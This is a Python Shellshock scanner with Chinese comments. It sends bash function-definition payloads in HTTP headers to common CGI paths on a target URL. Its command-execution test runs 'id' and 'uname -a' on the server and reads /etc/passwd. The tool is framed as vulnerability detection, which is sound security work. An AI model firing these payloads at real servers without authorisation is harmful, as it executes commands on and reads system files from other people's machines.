#!/usr/bin/env python3
"""
Shellshock (破壳漏洞) Web检测脚本
用于检测目标网站是否存在CVE-2014-6271和CVE-2014-7169漏洞
"""

import requests
import sys
import argparse
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# 禁用SSL警告（生产环境建议启用验证）
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ShellshockScanner:
    def __init__(self, target, timeout=10, verify_ssl=False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_cve_2014_6271(self, cgi_path):
        """测试原始Shellshock漏洞 CVE-2014-6271"""
        test_string = "shellshock_test_6271_" + str(int(time.time()))
        payload = f'() {{ :;}}; echo; echo "{test_string}"'
        
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Cookie': f'test={payload}'
        }
        
        url = f"{self.target}{cgi_path}"
        
        try:
            response = self.session.get(url, headers=headers, 
                                       timeout=self.timeout, 
                                       verify=self.verify_ssl)
            
            if test_string in response.text:
                return True, "CVE-2014-6271", f"在{cgi_path}中发现原始破壳漏洞"
            return False, None, None
            
        except requests.exceptions.RequestException as e:
            return False, None, f"请求失败: {str(e)}"
    
    def test_cve_2014_7169(self, cgi_path):
        """测试补丁绕过漏洞 CVE-2014-7169"""
        test_string = "shellshock_test_7169_" + str(int(time.time()))
        # CVE-2014-7169的特定payload
        payload = f'() {{ {test_string};}}; echo vulnerable'
        
        headers = {
            'User-Agent': payload,
            'X-Forwarded-For': payload
        }
        
        url = f"{self.target}{cgi_path}"
        
        try:
            response = self.session.get(url, headers=headers,
                                       timeout=self.timeout,
                                       verify=self.verify_ssl)
            
            # 检查响应中是否包含特殊错误模式（表明漏洞存在）
            if 'bash: error importing function' in response.text or \
               'warning: x: ignoring function definition attempt' in response.text:
                return True, "CVE-2014-7169", f"在{cgi_path}中发现补丁绕过漏洞"
            
            return False, None, None
            
        except requests.exceptions.RequestException as e:
            return False, None, f"请求失败: {str(e)}"
    
    def test_command_execution(self, cgi_path):
        """测试实际命令执行能力"""
        payloads = [
            # 执行'id'命令
            ('id', '() { :;}; echo; echo; id'),
            # 读取/etc/passwd
            ('passwd', '() { :;}; echo; echo; cat /etc/passwd 2>/dev/null || type C:\\Windows\\win.ini'),
            # 执行'uname -a'
            ('uname', '() { :;}; echo; echo; uname -a'),
        ]
        
        url = f"{self.target}{cgi_path}"
        
        for cmd_name, payload in payloads:
            try:
                headers = {'User-Agent': payload}
                response = self.session.get(url, headers=headers,
                                           timeout=self.timeout,
                                           verify=self.verify_ssl)
                
                # 检查命令输出特征
                if 'uid=' in response.text or 'root' in response.text or \
                   'Linux' in response.text and len(response.text) > 100:
                    return True, cmd_name, f"成功执行了'{cmd_name}'命令"
                    
            except:
                continue
        
        return False, None, None

def scan_cgi_paths(target, paths_file=None):
    """扫描常见的CGI路径"""
    default_paths = [
        '/cgi-bin/test.cgi',
        '/cgi-bin/test.sh',
        '/cgi-bin/status.cgi',
        '/cgi-bin/status.sh',
        '/cgi-bin/index.cgi',
        '/cgi-bin/printenv',
        '/cgi-bin/php.cgi',
        '/cgi-bin/perl.cgi',
        '/cgi-bin/awstats.pl',
        '/cgi-bin/php5.cgi',
        '/cgi-bin/admin.cgi',
        '/cgi-bin/webmail.cgi',
        '/cgi-bin/awstats/awstats.pl',
        '/cgi-bin/php4.cgi',
        '/cgi-bin/htsearch',
        '/cgi-bin/info2www',
        '/cgi-bin/classic/classic.xgi',
        '/cgi-bin/python.cgi',
        '/cgi-bin/fortinet/fortigate-login.cgi',
        '/cgi-mod/index.cgi',
        '/cgi-bin/awsstats/awsstats.pl',
    ]
    
    if paths_file:
        try:
            with open(paths_file, 'r') as f:
                custom_paths = [line.strip() for line in f if line.strip()]
                default_paths.extend(custom_paths)
        except:
            print(f"[-] 无法读取路径文件: {paths_file}")
    
    return default_paths

def main():
    parser = argparse.ArgumentParser(description='Shellshock (破壳漏洞) Web检测工具')
    parser.add_argument('-u', '--url', required=True, help='目标URL (例如: http://example.com)')
    parser.add_argument('-p', '--path', help='指定单个CGI路径进行测试')
    parser.add_argument('-f', '--file', help='从文件中读取CGI路径列表')
    parser.add_argument('-t', '--threads', type=int, default=5, help='线程数量 (默认: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时时间 (默认: 10秒)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='禁用SSL证书验证')
    
    args = parser.parse_args()
    
    # 初始化扫描器
    scanner = ShellshockScanner(args.url, args.timeout, not args.no_ssl_verify)
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║         Shellshock (破壳漏洞) Web安全检测工具           ║
║                      CVE-2014-6271                      ║
╚══════════════════════════════════════════════════════════╝
    """)
    print(f"[*] 目标: {args.url}")
    print(f"[*] 开始扫描...\n")
    
    # 获取要测试的CGI路径
    if args.path:
        cgi_paths = [args.path]
    else:
        cgi_paths = scan_cgi_paths(args.url, args.file)
    
    print(f"[*] 将测试 {len(cgi_paths)} 个CGI路径")
    
    vulnerable_found = []
    
    # 使用线程池进行扫描
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {}
        
        for path in cgi_paths:
            # 提交测试任务
            future_6271 = executor.submit(scanner.test_cve_2014_6271, path)
            future_7169 = executor.submit(scanner.test_cve_2014_7169, path)
            future_cmd = executor.submit(scanner.test_command_execution, path)
            
            futures[future_6271] = ('6271', path)
            futures[future_7169] = ('7169', path)
            futures[future_cmd] = ('cmd', path)
        
        # 处理结果
        for future in as_completed(futures):
            test_type, path = futures[future]
            try:
                result = future.result()
                if result and result[0]:
                    vuln_type, vuln_desc = result[1], result[2] if len(result) > 2 else ""
                    vulnerable_found.append({
                        'path': path,
                        'type': vuln_type,
                        'description': vuln_desc
                    })
                    print(f"[!] 发现漏洞! {vuln_type} - {path}")
                    if len(result) > 2:
                        print(f"    {result[2]}")
            except Exception as e:
                print(f"[-] 测试 {path} 时发生错误: {str(e)}")
    
    # 输出扫描结果
    print("\n" + "="*60)
    if vulnerable_found:
        print("[!] 警告: 检测到Shellshock漏洞!")
        print("\n漏洞详情:")
        for vuln in vulnerable_found:
            print(f"  • 路径: {vuln['path']}")
            print(f"    类型: {vuln['type']}")
            print(f"    描述: {vuln['description']}")
        print("\n[!] 该漏洞可导致远程代码执行，请立即修复!")
    else:
        print("[✓] 未检测到Shellshock漏洞")
        print("[*] 注意: 未发现漏洞不代表100%安全，建议结合其他工具进行深度测试")
    print("="*60)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print("""
用法示例:
  python shellshock_scanner.py -u http://example.com
  python shellshock_scanner.py -u http://example.com -p /cgi-bin/test.cgi
  python shellshock_scanner.py -u http://example.com -f cgi_paths.txt -t 10
  python shellshock_scanner.py -u https://example.com --no-ssl-verify
        """)
        sys.exit(1)
    
    main()